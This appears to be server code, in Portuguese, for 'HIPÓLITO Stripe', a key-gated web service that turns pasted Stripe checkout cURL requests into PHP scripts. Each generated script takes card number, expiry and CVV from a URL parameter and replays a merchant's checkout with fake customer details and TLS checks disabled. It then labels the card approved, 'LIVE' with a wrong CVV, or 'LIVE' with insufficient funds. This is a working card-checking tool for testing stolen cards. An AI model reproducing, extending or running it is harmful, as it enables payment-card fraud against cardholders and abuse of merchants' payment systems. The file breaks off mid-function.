# stripe.py — HIPÓLITO Stripe — Core (parser, gerador, renderer)
# Este arquivo fica NO SERVIDOR. O navegador nunca vê isso.
import re, os, shlex, uuid
from collections import OrderedDict
from datetime import datetime
from urllib.parse import unquote


# ============================================================
# 1) PARSER DE cURL (melhorado)
# ============================================================
def parse_curl(curl_str):
    curl_str = ' '.join(curl_str.strip().split())
    try:
        parts = shlex.split(curl_str, posix=True)
    except Exception:
        parts = curl_str.split()

    if not parts or parts[0] != 'curl':
        return None

    idx = 1
    method = 'GET'
    url = ''
    headers = OrderedDict()
    data = ''
    compressed = False
    use_cookie_jar = True

    while idx < len(parts):
        a = parts[idx]
        if a in ('-X', '--request'):
            idx += 1
            if idx < len(parts):
                method = parts[idx].upper()
        elif a in ('--data-binary', '-d', '--data', '--data-raw', '--data-urlencode'):
            idx += 1
            if idx < len(parts):
                chunk = parts[idx]
                data = (data + '&' + chunk) if data else chunk
                if method == 'GET':
                    method = 'POST'
        elif a == '--compressed':
            compressed = True
        elif a in ('-H', '--header'):
            idx += 1
            if idx < len(parts):
                line = parts[idx]
                if ':' in line:
                    k, v = line.split(':', 1)
                    headers[k.strip().lower()] = v.strip()
        elif a in ('-b', '--cookie'):
            idx += 1
            if idx < len(parts):
                ck = parts[idx]
                if ':' in ck:
                    k, v = ck.split(':', 1)
                    headers['cookie'] = v.strip()
        elif a in ('-A', '--user-agent'):
            idx += 1
            if idx < len(parts):
                headers['user-agent'] = parts[idx]
        elif a == '--no-cookie-jar':
            use_cookie_jar = False
        elif a.startswith('http'):
            url = a
        idx += 1

    if not url:
        for p in parts:
            if p.startswith('http'):
                url = p
                break

    return {
        'method': method,
        'url': url,
        'headers': headers,
        'data': data,
        'compressed': compressed,
        'use_cookie_jar': use_cookie_jar,
    }


# ============================================================
# 2) ANÁLISE (melhorada — detecta mais tipos)
# ============================================================
def analyze_request(parsed):
    url = parsed['url']
    data = parsed['data']
    method = parsed['method']

    a = {
        'type': 'REQUEST',
        'category': 'generic',
        'importance': 5,
        'extracts_token': False,
        'needs_token': False,
        'token_type': None,
        'has_card_data': False,
        'is_stripe_api': False,
        'is_site_request': False,
    }

    if 'api.stripe.com' in url:
        a['is_stripe_api'] = True
        if '/v1/payment_methods' in url:
            a.update(type='CREATE_PM', category='stripe_token', importance=10,
                     extracts_token=True, token_type='pm', has_card_data=True)
        elif '/v1/payment_intents' in url:
            a.update(type='PAYMENT_INTENT', category='stripe_payment', importance=9)
            if method == 'POST':
                a.update(needs_token=True, token_type='pm')
        elif '/v1/tokens' in url:
            a.update(type='CREATE_TOKEN', category='stripe_token', importance=10,
                     extracts_token=True, token_type='tok', has_card_data=True)
        elif '/v1/setup_intents' in url:
            a.update(type='SETUP_INTENT', category='stripe_setup', importance=8)
        elif '/v1/confirm' in url:
            a.update(type='CONFIRM', category='stripe_confirm', importance=9,
                     needs_token=True, token_type='pi')
        elif '/v1/charges' in url:
            a.update(type='CHARGE', category='stripe_charge', importance=9,
                     needs_token=True, token_type='tok')
    else:
        a['is_site_request'] = True
        a.update(type='SITE_POST', category='site', importance=7)
        if data:
            if 'payment_method=' in data or 'pm_' in data:
                a.update(needs_token=True, token_type='pm')
            if 'payment_intent' in data or 'pi_' in data:
                a.update(needs_token=True, token_type='pi')
            if 'client_secret' in data:
                a.update(needs_token=True, token_type='cs')
    return a


def extract_tokens_from_response(parsed):
    data = parsed['data']
    url = parsed['url']
    combined = f"{data} {url}"

    tokens = {}
    pats = {
        'pm_id':           r'(pm_[a-zA-Z0-9]{14,})',
        'pi_id':           r'(pi_[a-zA-Z0-9]{14,})(?!_secret_)',
        'token_id':        r'(tok_[a-zA-Z0-9]{14,})',
        'client_secret':   r'(pi_[a-zA-Z0-9]+_secret_[a-zA-Z0-9]+)',
        'setup_intent_id': r'(seti_[a-zA-Z0-9]{14,})',
    }
    for name, pat in pats.items():
        m = re.search(pat, combined)
        if m:
            tokens[name] = m.group(1)

    csrf_pats = [
        r'x-csrf-token:\s*([a-zA-Z0-9_\-]+)',
        r'csrf_token=([a-zA-Z0-9_\-]+)',
        r'authenticity_token=([a-zA-Z0-9/+=]+)',
        r'_token=([a-zA-Z0-9]+)',
    ]
    for pat in csrf_pats:
        m = re.search(pat, combined, re.IGNORECASE)
        if m:
            tokens['csrf_token'] = m.group(1)
            break
    return tokens


# ============================================================
# 3) GERADOR DE PHP (melhorado)
# ============================================================
def _esc(s):
    return s.replace('\\', '\\\\').replace('"', '\\"').replace('$', '\\$')


def _php_data(data, all_tokens):
    d = data
    # Substitui dados do cartão por variáveis PHP
    replacements = {
        r'card\[number\]=[^&]+': 'card[number]=" . $cc . "',
        r'card\[cvc\]=[^&]+': 'card[cvc]=" . $cvv . "',
        r'card\[exp_month\]=[^&]+': 'card[exp_month]=" . $mes . "',
        r'card\[exp_year\]=[^&]+': 'card[exp_year]=" . $ano . "',
        r'(?<![a-z_])number=[^&]+': 'number=" . $cc . "',
        r'(?<![a-z_])cvc=[^&]+': 'cvc=" . $cvv . "',
        r'(?<![a-z_])exp_month=[^&]+': 'exp_month=" . $mes . "',
        r'(?<![a-z_])exp_year=[^&]+': 'exp_year=" . $ano . "',
    }
    for pat, rep in replacements.items():
        d = re.sub(pat, rep, d)
    # Injeta tokens
    for tok_name, tok_val in all_tokens.items():
        if tok_name in ('pm_id', 'pi_id', 'token_id', 'setup_intent_id'):
            d = d.replace(tok_val, f'" . ${tok_name} . "')
    return d


def generate_professional_php(parsed_curls, admin_tag='@hipolitoofc'):
    analyzed = []
    all_tokens = {}

    for curl in parsed_curls:
        analysis = analyze_request(curl)
        tokens = extract_tokens_from_response(curl)
        analyzed.append({'curl': curl, 'analysis': analysis, 'tokens': tokens})
        all_tokens.update(tokens)

    analyzed.sort(key=lambda x: x['analysis']['importance'], reverse=True)

    p = []
    p.append('<?php')
    p.append('/**')
    p.append(' * HIPÓLITO Stripe — Alto Coder Professional v6.0')
    p.append(f' * Generated by {admin_tag}')
    p.append(' * Date: ' + datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
    p.append(' * Total Requests: ' + str(len(analyzed)))
    p.append(' */')
    p.append('')
    p.append('error_reporting(0);')
    p.append('set_time_limit(0);')
    p.append('date_default_timezone_set("America/Sao_Paulo");')
    p.append('')
    p.append('function detectBandeira($cc) {')
    p.append('    $cc = preg_replace("/[^0-9]/", "", $cc);')
    p.append('    if (preg_match("/^4[0-9]{12}(?:[0-9]{3})?$/", $cc)) return "Visa";')
    p.append('    if (preg_match("/^5[1-5][0-9]{14}$/", $cc)) return "Mastercard";')
    p.append('    if (preg_match("/^3[47][0-9]{13}$/", $cc)) return "Amex";')
    p.append('    if (preg_match("/^6(?:011|5[0-9]{2})[0-9]{12}$/", $cc)) return "Discover";')
    p.append('    if (preg_match("/^(?:2131|1800|35\\d{3})\\d{11}$/", $cc)) return "JCB";')
    p.append('    return "Unknown";')
    p.append('}')
    p.append('')
    p.append('$lista = isset($_GET["lista"]) ? $_GET["lista"] : "";')
    p.append('if (empty($lista)) die(json_encode(["status"=>"error","message"=>"Parametro lista obrigatorio. Use: CC|MES|ANO|CVV"]));')
    p.append('$parts = explode("|", $lista);')
    p.append('if (count($parts) < 4) die(json_encode(["status"=>"error","message"=>"Formato invalido. Use: CC|MES|ANO|CVV"]));')
    p.append('$cc  = preg_replace("/[^0-9]/", "", trim($parts[0]));')
    p.append('$mes = trim($parts[1]);')
    p.append('$ano = trim($parts[2]);')
    p.append('$cvv = trim($parts[3]);')
    p.append('if (strlen($ano) == 2) $ano = "20" . $ano;')
    p.append('if (strlen($cc) < 13 || strlen($cvv) < 3) die(json_encode(["status"=>"error","message"=>"Dados do cartao invalidos"]));')
    p.append('$bandeira = detectBandeira($cc);')
    p.append('$email = "cliente" . rand(1000,9999) . "@gmail.com";')
    p.append('$nome  = "Cliente " . rand(100,999);')
    p.append('$inicio = microtime(true);')
    p.append('')
    for tk in all_tokens:
        p.append(f'${tk} = "";')
    p.append('')
    p.append('$cookieFile = tempnam(sys_get_temp_dir(), "CK_");')
    p.append('$ch = curl_init();')
    p.append('curl_setopt_array($ch, [')
    p.append('    CURLOPT_RETURNTRANSFER => true,')
    p.append('    CURLOPT_SSL_VERIFYPEER => false,')
    p.append('    CURLOPT_SSL_VERIFYHOST => false,')
    p.append('    CURLOPT_FOLLOWLOCATION => true,')
    p.append('    CURLOPT_TIMEOUT => 60,')
    p.append('    CURLOPT_USERAGENT => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",')
    p.append(']);')
    p.append('')

    for i, item in enumerate(analyzed):
        curl = item['curl']
        analysis = item['analysis']
        url = curl['url']
        method = curl['method']
        headers = curl['headers']
        data = curl['data']
        compressed = curl['compressed']

        p.append(f'// STEP {i+1}: {analysis["type"]}')
        p.append(f'curl_setopt($ch, CURLOPT_URL, "{_esc(url)}");')
        p.append(f'curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "{method}");')

        if headers:
            p.append(f'$headers_{i} = [];')
            for k, v in headers.items():
                if k.lower() in ('host', 'content-length'):
                    continue
                p.append(f'$headers_{i}[] = "{_esc(k)}: {_esc(v)}";')
            p.append(f'curl_setopt($ch, CURLOPT_HTTPHEADER, $headers_{i});')

        if data and method in ('POST', 'PUT', 'PATCH'):
            d = _php_data(data, all_tokens)
            p.append(f'$data_{i} = "{d}";')
            p.append(f'curl_setopt($ch, CURLOPT_POSTFIELDS, $data_{i});')

        p.append(f'curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);')
        p.append(f'curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);')
        if compressed:
            p.append('curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");')
        p.append(f'$response_{i} = curl_exec($ch);')
        p.append(f'$httpCode_{i} = curl_getinfo($ch, CURLINFO_HTTP_CODE);')
        p.append('')

        if analysis['extracts_token']:
            p.append(f'$json_{i} = json_decode($response_{i}, true);')
            if analysis['token_type'] == 'pm':
                p.append(f'if (isset($json_{i}["id"])) $pm_id = $json_{i}["id"];')
                p.append(f'if (empty($pm_id)) {{ preg_match(\'/"id":\\s*"(pm_[^"]+)"/\', $response_{i}, $m); if (isset($m[1])) $pm_id = $m[1]; }}')
            elif analysis['token_type'] == 'tok':
                p.append(f'if (isset($json_{i}["id"])) $token_id = $json_{i}["id"];')
            elif analysis['token_type'] == 'pi':
                p.append(f'if (isset($json_{i}["id"])) $pi_id = $json_{i}["id"];')
                p.append(f'if (isset($json_{i}["client_secret"])) $client_secret = $json_{i}["client_secret"];')
            p.append('')

    p.append('curl_close($ch);')
    last = len(analyzed) - 1
    p.append(f'$tempo = number_format(microtime(true) - $inicio, 2);')
    p.append(f'$finalResponse = $response_{last};')
    p.append(f'$finalHttpCode = $httpCode_{last};')
    p.append('$finalJson = json_decode($finalResponse, true);')
    p.append('$status = "declined"; $message = "Cartao recusado";')
    p.append('if ($finalJson) {')
    p.append('    if (isset($finalJson["status"]) && $finalJson["status"] === "succeeded") { $status = "approved"; $message = "Pagamento aprovado com sucesso!"; }')
    p.append('    elseif (isset($finalJson["error"]["message"])) $message = $finalJson["error"]["message"];')
    p.append('    elseif (isset($finalJson["message"])) $message = is_array($finalJson["message"]) ? implode(" ", $finalJson["message"]) : $finalJson["message"];')
    p.append('} else {')
    p.append('    if (preg_match(\'/"message":\\s*"([^"]+)"/\', $finalResponse, $m)) $message = $m[1];')
    p.append('    elseif (preg_match(\'/"error":\\s*"([^"]+)"/\', $finalResponse, $m)) $message = $m[1];')
    p.append('}')
    p.append('if (stripos($message, "succeeded")!==false || stripos($message, "success")!==false || stripos($message, "approved")!==false) $status = "approved";')
    p.append('if (stripos($message, "cvc")!==false || stripos($message, "cvv")!==false || stripos($message, "security code")!==false) { $status = "live_cvv"; $message = "LIVE - CVV INCORRETO"; }')
    p.append('if (stripos($message, "insufficient")!==false || stripos($message, "funds")!==false || stripos($message, "saldo")!==false) { $status = "live_insufficient"; $message = "LIVE - SALDO INSUFICIENTE"; }')
    p.append('if (stripos($message, "expired")!==false || stripos($message, "expirou")!==false) { $status = "declined_expired"; $message = "CARTAO EXPIRADO"; }')
    p.append('echo json_encode(["status"=>$status,"message"=>$message,"card"=>$cc,"bandeira"=>$bandeira,"http_code"=>$finalHttpCode,"tempo"=>$tempo]);')
    p.append('?>')
    return '\n'.join(p)


# ============================================================
# 4) BUILD API (wrapper usado pelo main.py)
# ============================================================
def build_api(curls_text, admin_tag='@hipolitoofc'):
    raw_curls, current = [], []
    for line in curls_text.split('\n'):
        if line.strip().startswith('curl') and current:
            raw_curls.append(' '.join(current)); current = [line]
        else:
            current.append(line)
    if current:
        raw_curls.append(' '.join(current))
    if not raw_curls:
        raw_curls = [curls_text]

    parsed = []
    for c in raw_curls:
        r = parse_curl(c)
        if r and r['url']:
            parsed.append(r)

    if not parsed:
        return {'ok': False, 'message': 'Nenhum cURL válido encontrado'}

    php_code = generate_professional_php(parsed, admin_tag=admin_tag)
    filename = f'api_stripe_{uuid.uuid4().hex[:8]}.php'

    requests_info = []
    for i, p in enumerate(parsed):
        a = analyze_request(p)
        requests_info.append({
            'step': i + 1,
            'method': p['method'],
            'url': p['url'][:100],
            'purpose': a['type'],
        })

    return {
        'ok': True,
        'php_code': php_code,
        'filename': filename,
        'total_requests': len(parsed),
        'requests_info': requests_info,
    }


# ============================================================
# 5) RENDERIZADORES HTML (aqui as variáveis sensíveis
#    entram em memória — o navegador nunca vê o "código fonte"
#    do Python, só o HTML final já renderizado)
# ============================================================
LOGIN_CSS = """
<style>
:root{--green:#00ff88;--green2:#00cc66;--red:#ff3355;--text:#e8e8f5;--t2:#8888bb;--t3:#555577;--glass:rgba(8,8,20,.7);--gb:rgba(255,255,255,.08)}
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Inter',sans-serif;min-height:100vh;background:#050510;display:flex;align-items:center;justify-content:center;overflow:hidden}
.bg-img{position:fixed;inset:0;background:#050510 center/cover no-repeat;z-index:0}
.bg-ov{position:fixed;inset:0;background:rgba(0,0,0,.65);backdrop-filter:blur(5px);z-index:1}
.lc{position:relative;z-index:2;width:90%;max-width:430px;animation:up .7s cubic-bezier(.34,1.56,.64,1)}
@keyframes up{from{opacity:0;transform:translateY(50px) scale(.93)}to{opacity:1;transform:translateY(0) scale(1)}}
.lcard{background:var(--glass);backdrop-filter:blur(25px);border:1px solid var(--gb);border-radius:28px;padding:45px 35px 40px;text-align:center;box-shadow:0 30px 80px rgba(0,0,0,.6)}
.llogo{width:70px;height:70px;margin:0 auto 20px;background:linear-gradient(135deg,#00ff88,#00cc66);border-radius:20px;display:flex;align-items:center;justify-content:center;font-size:2em;box-shadow:0 15px 40px rgba(0,255,136,.35)}
.lcard h1{font-family:'Orbitron',sans-serif;font-size:2em;font-weight:900;letter-spacing:3px;margin-bottom:5px;background:linear-gradient(135deg,#fff 30%,#b0b0c0);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.lsub{font-size:.78em;color:var(--t3);margin-bottom:28px;letter-spacing:3px;text-transform:uppercase}
.lcard input{width:100%;padding:15px 16px;border:1.5px solid rgba(255,255,255,.06);border-radius:16px;background:rgba(255,255,255,.03);color:#fff;font-size:.95em;text-align:center;letter-spacing:1.5px;outline:none;transition:.3s}
.lcard input:focus{border-color:var(--green);background:rgba(0,255,136,.04);box-shadow:0 0 35px rgba(0,255,136,.1)}
.lcard button{width:100%;padding:15px;margin-top:20px;border:none;border-radius:16px;background:linear-gradient(135deg,#00ff88,#00cc66);color:#000;font-size:1em;font-weight:700;cursor:pointer;transition:.4s cubic-bezier(.34,1.56,.64,1);letter-spacing:1px}
.lcard button:hover{transform:translateY(-3px);box-shadow:0 15px 45px rgba(0,255,136,.45)}
.lerr{color:#ff5252;margin-top:14px;font-size:.8em;display:none;padding:10px 14px;background:rgba(255,51,85,.08);border-radius:12px;border:1px solid rgba(255,51,85,.2)}
.lerr.show{display:block}
.lfoot{margin-top:20px;font-size:.7em;color:var(--t3);letter-spacing:1px}
.lfoot a{color:var(--green);text-decoration:none;font-weight:600}
@media(max-width:500px){.lcard{padding:30px 22px}.lcard h1{font-size:1.5em}.llogo{width:55px;height:55px;font-size:1.5em}}
</style>
"""


def _login_html(channel, admin_tag, error=''):
    return f"""<!DOCTYPE html>
<html lang="pt-BR"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>HIPÓLITO Stripe | Login</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
{LOGIN_CSS}
</head><body>
<div class="bg-img"></div><div class="bg-ov"></div>
<div class="lc"><div class="lcard">
<div class="llogo">⚡</div>
<h1>HIPÓLITO</h1>
<p class="lsub">Stripe Alto Coder v6.0</p>
<form method="POST" action="/login">
<input type="password" name="key" placeholder="DIGITE SUA KEY DE ACESSO" autocomplete="off" required autofocus>
<button type="submit">🚀 ACESSAR SISTEMA</button>
</form>
<div class="lerr" id="err"></div>
<div class="lfoot">© 2024 <a href="{channel}" target="_blank">{admin_tag}</a> | Acesso Restrito</div>
</div></div>
<script>
const u=new URLSearchParams(location.search),e=u.get('error'),d=document.getElementById('err');
if(e){{d.textContent=e==='invalid_key'?'⚠️ Key inválida!':e==='desativado'?'⛔ Key desativada!':e==='empty'?'⚠️ Digite uma key!':'⚠️ '+decodeURIComponent(e);d.classList.add('show');}}
</script>
</body></html>"""


APP_CSS = """
<style>
:root{--bg:#050510;--s:#0a0a1a;--s2:#0f0f25;--b:#1a1a3a;--bh:#2a2a5a;--g:#00ff88;--g2:#00cc66;--bl:#3399ff;--pu:#8844ff;--r:#ff3355;--y:#ffaa00;--t:#e8e8f5;--t2:#8888bb;--t3:#555577;--gm:linear-gradient(135deg,#00ff88,#00ddff,#8844ff)}
*{margin:0;padding:0;box-sizing:border-box}
body{background:var(--bg);color:var(--t);font-family:'Inter',sans-serif;min-height:100vh}
.app{max-width:1100px;margin:0 auto;padding:20px}
.header{text-align:center;padding:30px 20px 25px}
.logo-text{font-family:'Orbitron',sans-serif;font-size:2.6em;font-weight:900;letter-spacing:4px;background:var(--gm);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.sub{font-family:monospace;color:var(--t3);letter-spacing:3px;font-size:.8em;margin-top:5px}
.ubar{display:inline-flex;align-items:center;gap:10px;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.08);border-radius:50px;padding:8px 20px;margin-top:12px;font-size:.8em;color:var(--t2)}
.ubar .dot{width:8px;height:8px;border-radius:50%;background:var(--g);box-shadow:0 0 10px rgba(0,255,136,.5)}
.lout{color:var(--r);text-decoration:none;font-weight:600;margin-left:10px}
.badge-row{display:flex;justify-content:center;gap:10px;margin-top:15px;flex-wrap:wrap}
.badge{padding:6px 16px;border-radius:25px;font-size:.7em;font-weight:600;letter-spacing:1.5px;text-transform:uppercase}
.bg-g{background:rgba(0,255,136,.08);border:1px solid rgba(0,255,136,.25);color:var(--g)}
.bg-b{background:rgba(51,153,255,.08);border:1px solid rgba(51,153,255,.25);color:var(--bl)}
.bg-p{background:rgba(136,68,255,.08);border:1px solid rgba(136,68,255,.25);color:var(--pu)}
.tg-btn{display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,#0088cc,#006699);color:#fff;padding:8px 18px;border-radius:25px;text-decoration:none;font-weight:600;font-size:.8em;letter-spacing:1px;transition:.3s;margin-top:12px}
.tg-btn:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(0,136,204,.4)}
.mc{background:var(--s);border:1px solid var(--b);border-radius:24px;padding:30px;box-shadow:0 25px 80px rgba(0,0,0,.5)}
.ch{display:flex;align-items:center;gap:12px;margin-bottom:10px}
.ci{width:42px;height:42px;background:linear-gradient(135deg,rgba(0,255,136,.2),rgba(0,221,255,.2));border:1px solid rgba(0,255,136,.3);border-radius:14px;display:flex;align-items:center;justify-content:center;font-size:1.2em}
.ct{font-size:1.2em;font-weight:700}
.cd{color:var(--t2);font-size:.85em;margin-bottom:20px;line-height:1.5}
textarea{width:100%;min-height:280px;background:var(--bg);border:2px solid var(--b);border-radius:16px;padding:18px;color:var(--g);font-family:monospace;font-size:.8em;line-height:1.7;resize:vertical;outline:none;transition:.4s}
textarea:focus{border-color:var(--g);box-shadow:0 0 0 5px rgba(0,255,136,.06)}
textarea::placeholder{color:#1f1f40;font-style:italic}
.btn-row{display:flex;gap:12px;margin-top:20px;flex-wrap:wrap}
.btn{padding:14px 28px;border:none;border-radius:14px;font-size:.9em;font-weight:700;letter-spacing:1.5px;cursor:pointer;transition:.3s;display:flex;align-items:center;gap:8px;text-transform:uppercase}
.btn-p{background:linear-gradient(135deg,var(--g),var(--g2));color:#000;flex:1;justify-content:center;box-shadow:0 0 30px rgba(0,255,136,.4)}
.btn-p:hover{transform:translateY(-3px);box-shadow:0 15px 45px rgba(0,255,136,.5)}
.btn-s{background:transparent;border:2px solid var(--b);color:var(--t2)}
.btn-s:hover{border-color:var(--r);color:var(--r)}
.results{margin-top:25px;display:none}
.results.show{display:block;animation:fadeUp .5s}
@keyframes fadeUp{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
.rc{background:var(--s2);border:1px solid var(--b);border-radius:16px;padding:20px;margin-bottom:12px}
.rc.success{border-left:4px solid var(--g)}
.rc.error{border-left:4px solid var(--r)}
.rc.info{border-left:4px solid var(--bl)}
.rc.code{border-left:4px solid var(--pu)}
.tag{display:inline-block;padding:5px 14px;border-radius:20px;font-size:.75em;font-weight:700;letter-spacing:1px;margin-bottom:10px}
.tag-g{background:rgba(0,255,136,.12);color:var(--g)}
.tag-r{background:rgba(255,51,85,.12);color:var(--r)}
.tag-b{background:rgba(51,153,255,.12);color:var(--bl)}
.tag-p{background:rgba(136,68,255,.12);color:var(--pu)}
.step-list{list-style:none;margin-top:10px}
.step-item{display:flex;align-items:center;gap:10px;padding:10px 12px;background:var(--bg);border-radius:10px;margin-bottom:5px;font-size:.8em;flex-wrap:wrap}
.step-num{width:28px;height:28px;background:var(--s2);border:2px solid var(--b);border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:.75em;color:var(--g)}
.mt{padding:2px 8px;border-radius:5px;font-family:monospace;font-size:.65em;font-weight:700}
.mt-POST{background:rgba(0,255,136,.12);color:var(--g)}
.mt-GET{background:rgba(51,153,255,.12);color:var(--bl)}
.step-info{flex:1;min-width:150px}
.step-url{color:var(--t3);word-break:break-all;font-size:.82em;font-family:monospace}
.step-purpose{color:var(--y);font-size:.68em;text-transform:uppercase;letter-spacing:1.5px;font-weight:700;background:rgba(255,170,0,.08);padding:3px 8px;border-radius:15px}
.code-block{background:#000;padding:16px;border-radius:12px;font-family:monospace;font-size:.75em;color:var(--g);margin-top:10px;word-break:break-all;overflow:auto;max-height:400px;border:1px solid var(--b);line-height:1.6;white-space:pre-wrap}
.code-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:8px;flex-wrap:wrap;gap:10px}
.code-actions{display:flex;gap:8px;flex-wrap:wrap}
.btn-sm{padding:8px 16px;border:none;border-radius:8px;font-size:.75em;font-weight:600;cursor:pointer;letter-spacing:1px;text-transform:uppercase}
.btn-sm-copy{background:var(--bl);color:#fff}
.btn-sm-copy:hover{background:#0066cc}
.btn-sm-dl{background:var(--pu);color:#fff}
.btn-sm-dl:hover{background:#6622cc}
.loader{display:flex;align-items:center;justify-content:center;gap:12px;padding:40px}
.spinner{width:28px;height:28px;border:3px solid var(--b);border-top-color:var(--g);border-radius:50%;animation:spin .7s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.loader-text{color:var(--t2);font-weight:500}
.toast{position:fixed;top:20px;right:20px;padding:14px 24px;border-radius:14px;color:#fff;font-weight:700;z-index:9999;animation:tin .4s cubic-bezier(.16,1,.3,1);max-width:90vw;font-size:.85em;box-shadow:0 15px 40px rgba(0,0,0,.5)}
.toast-success{background:#00cc66}
.toast-error{background:#ff3355}
@keyframes tin{from{opacity:0;transform:translateX(120px)}to{opacity:1;transform:translateX(0)}}
.footer{text-align:center;padding:25px;color:var(--t3);font-size:.75em;letter-spacing:1px}
.footer a{color:var(--g);text-decoration:none;font-weight:600}
.fdiv{width:50px;height:2px;background:var(--gm);margin:12px auto;border-radius:10px}
@media(max-width:768px){.app{padding:10px}.logo-text{font-size:1.8em}.mc{padding:18px}textarea{min-height:220px;font-size:.7em}.btn-row{flex-direction:column}.btn{width:100%;justify-content:center}.toast{top:10px;right:10px;left:10px;max-width:none}}
</style>
"""


def _app_html(user, plano, expiracao, channel, admin_tag):
    return f"""<!DOCTYPE html>
<html lang="pt-BR"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>HIPÓLITO Stripe | Alto Coder v6.0</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
{APP_CSS}
</head><body>
<div class="app">
<div class="header">
<div class="logo-text">HIPÓLITO</div>
<div class="sub">STRIPE ALTO CODER</div>
<div class="ubar"><span class="dot"></span><span>{user} | 💎 {plano} | 📅 {expiracao}</span><a href="/logout" class="lout">🚪 SAIR</a></div>
<div class="badge-row">
<span class="badge bg-g">🔒 Stripe API</span>
<span class="badge bg-b">🔄 Multi cURLs</span>
<span class="badge bg-p">🤖 Auto Detect</span>
</div>
<a href="{channel}" target="_blank" class="tg-btn">📢 Canal Telegram</a>
</div>

<div class="mc">
<div class="ch"><div class="ci">📋</div><div><div class="ct">Cole seus cURLs do Stripe</div>
<div class="cd">Suporte ilimitado a cURLs. O sistema identifica tokens, payment methods e monta a sequência correta.</div></div></div>
<textarea id="curlInput" placeholder="Cole aqui seus cURLs...

curl 'https://api.stripe.com/v1/payment_methods' \\
  -H 'content-type: application/x-www-form-urlencoded' \\
  --data-raw 'type=card&card[number]=4242424242424242'"></textarea>
<div class="btn-row">
<button class="btn btn-p" onclick="generateAPI()">⚡ GERAR API AGORA</button>
<button class="btn btn-s" onclick="clearAll()">🗑️ LIMPAR TUDO</button>
</div>
<div class="results" id="results"><div id="resultsContent"></div></div>
</div>

<div class="footer">
<div class="fdiv"></div>
© 2024 <a href="{channel}" target="_blank">HIPÓLITO Stripe</a> | Alto Coder Professional | {admin_tag}
<br><span style="font-size:.85em;color:var(--t3)">Ctrl + Enter para gerar rapidamente</span>
</div>
</div>

<script>
let currentGeneratedCode='',currentFilename='';
function toast(m,t){{const e=document.createElement('div');e.className='toast toast-'+t;e.textContent=m;document.body.appendChild(e);setTimeout(()=>{{e.style.opacity='0';setTimeout(()=>e.remove(),300)}},3500)}}
async function generateAPI(){{
const c=document.getElementById('curlInput').value;
if(!c.trim()){{toast('⚠️ Cole seus cURLs primeiro!','error');return}}
const r=document.getElementById('results'),ct=document.getElementById('resultsContent');
r.classList.add('show');ct.innerHTML='<div class="rc info"><div class="loader"><div class="spinner"></div><span class="loader-text">Analisando e processando cURLs...</span></div></div>';
r.scrollIntoView({{behavior:'smooth',block:'center'}});
try{{
const resp=await fetch('/api/generate',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{curls:c}})}});
const d=await resp.json();
if(d.status==='success'){{currentGeneratedCode=d.php_code;currentFilename=d.filename;showResults(d);toast('✅ API gerada! '+d.total_requests+' requisições.','success')}}
else{{showError(d.message);toast('❌ '+d.message,'error')}}
}}catch(e){{showError('Erro: '+e.message);toast('❌ Erro de conexão','error')}}
}}
function showResults(d){{
const ct=document.getElementById('resultsContent');let s='';
d.requests.forEach((r,i)=>{{s+='<div class="step-item"><div class="step-num">'+(i+1)+'</div><span class="mt mt-'+r.method+'">'+r.method+'</span><div class="step-info"><div class="step-url">'+escapeHtml(r.url.substring(0,60))+'...</div></div><span class="step-purpose">'+r.purpose+'</span></div>'}});
ct.innerHTML='<div class="rc success"><span class="tag tag-g">✅ API GERADA</span><div>'+d.message+'</div></div>'+
'<div class="rc info"><span class="tag tag-b">📋 '+d.total_requests+' REQUISIÇÕES</span><div class="step-list">'+s+'</div></div>'+
'<div class="rc code"><div class="code-head"><span class="tag tag-p">📄 CÓDIGO PHP</span><div class="code-actions"><button class="btn-sm btn-sm-copy" onclick="copyCode()">📋 COPIAR</button><button class="btn-sm btn-sm-dl" onclick="downloadCode()">💾 BAIXAR</button></div></div><div class="code-block">'+escapeHtml(d.php_code)+'</div></div>';
ct.scrollIntoView({{behavior:'smooth',block:'center'}});
}}
function showError(m){{document.getElementById('resultsContent').innerHTML='<div class="rc error"><span class="tag tag-r">❌ ERRO</span><div>'+escapeHtml(m)+'</div></div>'}}
function copyCode(){{if(!currentGeneratedCode){{toast('❌ Nada pra copiar','error');return}}navigator.clipboard.writeText(currentGeneratedCode).then(()=>toast('✅ Copiado!','success')).catch(()=>toast('❌ Falha','error'))}}
function downloadCode(){{if(!currentGeneratedCode){{toast('❌ Nada pra baixar','error');return}}const b=new Blob([currentGeneratedCode],{{type:'text/php'}});const a=document.createElement('a');a.href=URL.createObjectURL(b);a.download=currentFilename||'api.php';a.click();toast('✅ Download!','success')}}
function clearAll(){{document.getElementById('curlInput').value='';document.getElementById('results').classList.remove('show');document.getElementById('resultsContent').innerHTML='';currentGeneratedCode='';currentFilename='';toast('🗑️ Limpo!','success')}}
function escapeHtml(t){{if(!t)return'';const d=document.createElement('div');d.textContent=t;return d.innerHTML}}
document.addEventListener('keydown',e=>{{if((e.ctrlKey||e.metaKey)&&e.key==='Enter'){{e.preventDefault();generateAPI()}}}});
</script>
</body></html>"""


# ============================================================
# 6) FUNÇÕES PÚBLICAS (usadas pelo main.py)
# ============================================================
def render_login(channel='', admin_tag='', error=''):
